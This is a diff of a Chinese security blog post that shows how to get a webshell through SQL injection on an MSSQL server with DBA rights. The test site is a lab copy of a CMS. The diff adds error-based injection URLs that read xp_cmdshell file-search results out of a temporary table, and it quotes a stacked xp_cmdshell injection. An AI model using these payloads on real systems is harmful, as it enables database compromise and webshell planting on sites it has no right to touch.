@@ -21,10 +21,12 @@
 <meta property="og:image" content="https://fupinglee.github.io/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/错误的搜索结果.png">
 <meta property="og:image" content="https://fupinglee.github.io/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/无法执行xp_cmdshell.png">
 <meta property="og:image" content="https://fupinglee.github.io/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/执行搜索并结果插入到临时表.png">
+<meta property="og:image" content="https://fupinglee.github.io/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/报错读出1.png">
+<meta property="og:image" content="https://fupinglee.github.io/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/报错读出2.png">
 <meta property="og:image" content="https://fupinglee.github.io/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/导出临时表.png">
 <meta property="og:image" content="https://fupinglee.github.io/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/查看写入的测试文件.png">
 <meta property="og:image" content="https://fupinglee.github.io/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/查看一句话.png">
-<meta property="og:updated_time" content="2017-05-16T06:54:49.643Z">
+<meta property="og:updated_time" content="2017-05-17T06:41:48.595Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="MSSQL DBA权限获取WEBSHELL的过程">
 <meta name="twitter:description" content="前言本文主要通过一个案例来演示一下当MSSQL是DBA权限，且不知道路径的时候如何去获取WEBSHELL。当然这种方式对站库分离的无效。我测试的环境是在Win7 64位下，数据库是SQLServer 2000，IIS版本是7.5，程序是采用风讯的CMS。后台登录后有多处注入，因为这里是演示用注入获取WEBSHELL，因此就不考虑后台上传的情况了，只是用注入来实现。">
@@ -208,7 +210,11 @@
 <blockquote>
 <p>在执行上述搜索和插入过程后，可以使用<code>&#39; and (select(*) from tt_tmp)&gt;1</code>页面返回是否正常来判断是否有搜索结果。当没有找到的话，<code>select(*) from tt_tmp</code>的结果为1，否则大于1。如果没有的话，就换目录，可以试试其他盘符，如<code>&#39;;insert into tt_tmp(tmp1) exec master..xp_cmdshell &#39;for /r d:\ %i in (Newslist*.aspx) do @echo %i &#39;;--</code>。也可以使用sqlmap来查看条数。</p>
 </blockquote>
-<p>找到结果后将表中数据读取出来</p>
+<p>可以用报错将表内容给显示出来<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=2<span class="string">' and 1=(select top 1 tmp1 from tt_tmp)and '</span>a<span class="string">'='</span>a</div></pre></td></tr></table></figure></p>
+<p><img src="/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/报错读出1.png" alt="报错读出1"></p>
+<p>继续爆<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=2<span class="string">' and 1=(select top 1 tmp1 from tt_tmp where tmp1 not in ('</span>c:\inetpub\wwwroot\manage\news\NewsList.aspx <span class="string">'))and '</span>a<span class="string">'='</span>a</div></pre></td></tr></table></figure></p>
+<p><img src="/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/报错读出2.png" alt="报错读出2"></p>
+<p>也可以用sqlmap直接将表中数据读取出来</p>
 <p><img src="/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/导出临时表.png" alt="导出临时表"></p>
 <p>然后根据导出结果的路径来判断是否可能为WEB目录。然后写入一个测试文件，看是否可以访问来进一步证实结果。</p>
 <p>这里在根目录写了一个txt文件，写别的目录怕因为没有权限而无法访问。</p>
@@ -487,19 +493,19 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">教程</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">主题</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">方程式</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">SMB漏洞</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">教程</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">主题</a>
               </li>
              
               <li class="article-tag-list-item">
